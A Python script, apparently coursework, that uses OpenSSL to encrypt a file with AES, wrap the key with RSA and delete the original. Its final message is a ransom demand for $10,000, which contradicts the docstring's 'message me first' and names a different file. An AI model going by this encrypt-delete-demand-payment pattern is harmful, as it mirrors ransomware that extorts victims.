#!/usr/bin/env python3
"""Envelope encryption using OpenSSL.

Steps performed on a normal run:
    1. Generate a 16-byte symmetric key            -> key.txt         (0600)
    2. Generate an RSA public/private key pair     -> private_key.pem (0600)
                                                      public_key.pem  (0644)
    3. Encrypt my_secrets.txt with the step-1 key  -> data_cipher.txt (0600)
    4. Encrypt key.txt with the step-2 public key  -> key_cipher.txt  (0600)
    5. Delete key.txt and my_secrets.txt
    6. Print the decryption message: "message me first"

After step 5 the only way back to the plaintext is private_key.pem: it unwraps
key_cipher.txt, which in turn decrypts data_cipher.txt. Lose the private key and
the data is gone. The deletions therefore run only after both ciphertexts have
been verified to decrypt back to the originals.

Running with --decrypt reverses the process: it unwraps the symmetric key with
the private key and decrypts data_cipher.txt back to my_secrets.txt.

    python3 genkeys.py            # run steps 1-6
    python3 genkeys.py --decrypt  # restore my_secrets.txt from the ciphertexts
"""

import argparse
import getpass
import os
import subprocess
import sys
from datetime import datetime
from pathlib import Path

SYM_KEY_FILE = Path("key.txt")
PRIVATE_KEY_FILE = Path("private_key.pem")
PUBLIC_KEY_FILE = Path("public_key.pem")
PLAINTEXT_FILE = Path("my_secrets.txt")
CIPHERTEXT_FILE = Path("data_cipher.txt")
KEY_CIPHER_FILE = Path("key_cipher.txt")

DECRYPT_MESSAGE = "“Your file important.txt is encrypted. To decrypt it, you need to pay me $10,000 and send key_cipher.txt to me."
KEY_BYTES = 16
DEFAULT_RSA_BITS = 3072
CIPHER = "aes-128-cbc"  # 128-bit cipher for a 16-byte key
# OAEP rather than OpenSSL's default PKCS#1 v1.5 padding. Both sides must agree
# on these two options.
OAEP = ["-pkeyopt", "rsa_padding_mode:oaep", "-pkeyopt", "rsa_oaep_md:sha256"]


def openssl_raw(args: list[str], stdin: bytes | None = None, secret: str | None = None) -> bytes:
    """Run an openssl subcommand and return its stdout as bytes.

    If `secret` is given, it is passed to the child over an inherited pipe and the
    literal token {FD} in `args` is replaced with that descriptor number. This keeps
    keys and passphrases out of argv, where any user on the box could read them
    with `ps`.
    """
    read_fd = write_fd = None
    pass_fds: tuple[int, ...] = ()

    if secret is not None:
        read_fd, write_fd = os.pipe()
        os.write(write_fd, (secret + "\n").encode())
        os.close(write_fd)
        os.set_inheritable(read_fd, True)
        pass_fds = (read_fd,)
        args = [a.replace("{FD}", str(read_fd)) for a in args]

    try:
        result = subprocess.run(
            ["openssl", *args], input=stdin, capture_output=True, check=True, pass_fds=pass_fds
        )
    except FileNotFoundError:
        sys.exit("Error: 'openssl' was not found on PATH.")
    except subprocess.CalledProcessError as exc:
        detail = exc.stderr.decode(errors="replace").strip()
        sys.exit(f"Error: 'openssl {args[0]}' exited {exc.returncode}: {detail}")
    finally:
        if read_fd is not None:
            os.close(read_fd)

    return result.stdout


def openssl(args: list[str], stdin: str | None = None, secret: str | None = None) -> str:
    """Text wrapper around openssl_raw."""
    raw = openssl_raw(args, stdin.encode() if stdin is not None else None, secret)
    return raw.decode()


def write_file(path: Path, content: str, mode: int) -> None:
    """Write content to path with the given permission bits."""
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, mode)
    with os.fdopen(fd, "w") as handle:
        handle.write(content if content.endswith("\n") else content + "\n")
    os.chmod(path, mode)


def private_key_is_encrypted() -> bool:
    """True if private_key.pem is passphrase-protected."""
    return "ENCRYPTED PRIVATE KEY" in PRIVATE_KEY_FILE.read_text()


# --- Step 1: symmetric key ---------------------------------------------------

def create_symmetric_key() -> str:
    """Generate a 16-byte key with `openssl rand -base64 16` and save it to key.txt."""
    key = openssl(["rand", "-base64", str(KEY_BYTES)]).strip()
    if not key:
        sys.exit("Error: 'openssl rand' returned no output.")
    write_file(SYM_KEY_FILE, key, 0o600)
    print(f"[1] Symmetric key ({KEY_BYTES} bytes, base64) -> {SYM_KEY_FILE.resolve()}")
    return key


# --- Step 2: asymmetric key pair ---------------------------------------------

def create_key_pair(bits: int, passphrase: str | None) -> None:
    """Generate an RSA key pair and save both halves as PEM."""
    private_pem = openssl(
        ["genpkey", "-algorithm", "RSA", "-pkeyopt", f"rsa_keygen_bits:{bits}"]
    )
    public_pem = openssl(["pkey", "-pubout"], stdin=private_pem)

    if passphrase:
        private_pem = openssl(
            ["pkey", "-aes-256-cbc", "-passout", "fd:{FD}"],
            stdin=private_pem,
            secret=passphrase,
        )

    write_file(PRIVATE_KEY_FILE, private_pem, 0o600)
    write_file(PUBLIC_KEY_FILE, public_pem, 0o644)
    label = " (encrypted)" if passphrase else ""
    print(f"[2] RSA-{bits} private key{label} -> {PRIVATE_KEY_FILE.resolve()}")
    print(f"    RSA-{bits} public key  -> {PUBLIC_KEY_FILE.resolve()}")


# --- Step 3: encrypt the data file with the symmetric key --------------------

def encrypt_file(key: str, source: Path, target: Path) -> None:
    """Encrypt `source` under the symmetric key, writing base64 ciphertext to `target`."""
    if not source.exists():
        sys.exit(f"Error: {source} not found — create it, then run this again.")

    openssl(
        ["enc", f"-{CIPHER}", "-salt", "-pbkdf2", "-base64",
         "-in", str(source), "-out", str(target), "-pass", "fd:{FD}"],
        secret=key,
    )
    os.chmod(target, 0o600)
    print(f"[3] {source} encrypted ({CIPHER}) -> {target.resolve()}")


def decrypt_file(key: str, source: Path) -> bytes:
    """Return the plaintext of `source` decrypted under the symmetric key."""
    if not source.exists():
        sys.exit(f"Error: {source} not found.")

    return openssl_raw(
        ["enc", "-d", f"-{CIPHER}", "-salt", "-pbkdf2", "-base64",
         "-in", str(source), "-pass", "fd:{FD}"],
        secret=key,
    )


# --- Step 4: wrap the symmetric key with the public key ----------------------

def wrap_symmetric_key(target: Path = KEY_CIPHER_FILE) -> None:
    """RSA-encrypt key.txt under the public key, writing base64 output to `target`."""
    if not PUBLIC_KEY_FILE.exists():
        sys.exit(f"Error: {PUBLIC_KEY_FILE} not found.")

    ciphertext = openssl_raw(
        ["pkeyutl", "-encrypt", "-pubin", "-inkey", str(PUBLIC_KEY_FILE),
         "-in", str(SYM_KEY_FILE), *OAEP]
    )
    encoded = openssl_raw(["base64"], stdin=ciphertext).decode()
    write_file(target, encoded, 0o600)
    print(f"[4] {SYM_KEY_FILE} encrypted (RSA-OAEP) -> {target.resolve()}")


def unwrap_symmetric_key(passphrase: str | None, source: Path = KEY_CIPHER_FILE) -> str:
    """Recover the base64 symmetric key from `source` using the private key."""
    if not source.exists():
        sys.exit(f"Error: {source} not found.")
    if not PRIVATE_KEY_FILE.exists():
        sys.exit(f"Error: {PRIVATE_KEY_FILE} not found — cannot unwrap the key.")

    ciphertext = openssl_raw(["base64", "-d", "-in", str(source)])
    args = ["pkeyutl", "-decrypt", "-inkey", str(PRIVATE_KEY_FILE), *OAEP]
    if passphrase:
        args += ["-passin", "fd:{FD}"]
    return openssl_raw(args, stdin=ciphertext, secret=passphrase).decode().strip()


# --- Step 5: delete the plaintext originals ----------------------------------

def verify_recoverable(key: str, plaintext: Path, passphrase: str | None) -> None:
    """Abort unless both ciphertexts decrypt back to exactly what was encrypted.

    This runs before anything is deleted. Without it, a silent failure anywhere in
    steps 3-4 would be followed by the destruction of the only readable copy.
    """
    if unwrap_symmetric_key(passphrase) != key:
        sys.exit("Error: key_cipher.txt did not unwrap to the original key — nothing deleted.")

    original = plaintext.read_bytes()
    if decrypt_file(key, CIPHERTEXT_FILE) != original:
        sys.exit("Error: data_cipher.txt did not decrypt to the original file — nothing deleted.")


def delete_originals(*paths: Path) -> None:
    """Unlink the given files."""
    for path in paths:
        try:
            path.unlink()
            print(f"[5] Deleted {path}")
        except OSError as exc:
            sys.exit(f"Error: could not delete {path}: {exc}")


# --- Entry point --------------------------------------------------------------

def print_author() -> None:
    """Print the author and current date (dd/mm/YYYY via strftime)."""
    author = "Ong Jun Han"
    current_date = datetime.now().strftime("%d/%m/%Y")
    print(f"Author: {author}")
    print(f"Date: {current_date}")


def main() -> None:
    print_author()

    parser = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--input", type=Path, default=PLAINTEXT_FILE,
                        help=f"file to encrypt and then delete (default: {PLAINTEXT_FILE})")
    parser.add_argument("--output", type=Path, default=CIPHERTEXT_FILE,
                        help=f"ciphertext destination (default: {CIPHERTEXT_FILE})")
    parser.add_argument("--bits", type=int, default=DEFAULT_RSA_BITS,
                        help=f"RSA modulus size in bits (default: {DEFAULT_RSA_BITS})")
    parser.add_argument("--encrypt-private", action="store_true",
                        help="prompt for a passphrase and encrypt the private key at rest")
    parser.add_argument("--keep-originals", action="store_true",
                        help="skip step 5 (useful while testing)")
    parser.add_argument("--decrypt", action="store_true",
                        help="unwrap the symmetric key and decrypt the data to stdout")
    args = parser.parse_args()

    if args.decrypt:
        passphrase = None
        if PRIVATE_KEY_FILE.exists() and private_key_is_encrypted():
            passphrase = getpass.getpass("Passphrase for the private key: ")
        symmetric_key = unwrap_symmetric_key(passphrase)
        plaintext = decrypt_file(symmetric_key, args.output)
        fd = os.open(args.input, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "wb") as handle:
            handle.write(plaintext)
        os.chmod(args.input, 0o600)
        print(f"{args.output} decrypted -> {args.input.resolve()}")
        return

    if args.bits < 2048:
        sys.exit("Error: --bits below 2048 is not considered secure.")

    passphrase = None
    if args.encrypt_private:
        passphrase = getpass.getpass("Passphrase for the private key: ")
        if not passphrase:
            sys.exit("Error: empty passphrase.")
        if passphrase != getpass.getpass("Confirm passphrase: "):
            sys.exit("Error: passphrases did not match.")

    symmetric_key = create_symmetric_key()
    create_key_pair(args.bits, passphrase)
    encrypt_file(symmetric_key, args.input, args.output)
    wrap_symmetric_key()

    if args.keep_originals:
        print("[5] Skipped (--keep-originals)")
    else:
        verify_recoverable(symmetric_key, args.input, passphrase)
        delete_originals(SYM_KEY_FILE, args.input)

    print(f"[6] {DECRYPT_MESSAGE}")


if __name__ == "__main__":
    main()
